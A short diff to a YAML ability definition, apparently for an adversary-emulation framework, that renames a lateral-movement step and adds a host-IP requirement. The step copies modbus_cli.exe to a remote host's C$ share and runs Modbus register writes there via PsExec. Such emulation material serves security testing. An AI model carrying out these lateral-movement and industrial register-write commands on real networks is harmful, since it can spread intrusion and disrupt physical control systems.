@@ -1,5 +1,5 @@
 - id: tx1_lateral_copy_modbus_cli
-  name: TX1_Lateral_Copy_modbus_cli
+  name: TX1 Lateral Copy modbus_cli
   description: Copy modbus_cli.exe to remote host and execute multiple register write commands remotely via PsExec.
   tactic: lateral-movement
   technique:
@@ -13,3 +13,8 @@
           Copy-Item -Path "C:\Users\Public\modbus_cli.exe" -Destination "\\172.18.24.12\C$\Windows\Temp\" -Force
         payloads:
           - modbus_cli.exe
+  requirements:
+    - plugins.stockpile.app.requirements.basic:
+      - source: host.ip.address
+        edge: contains
+        target: 172.16.24.10
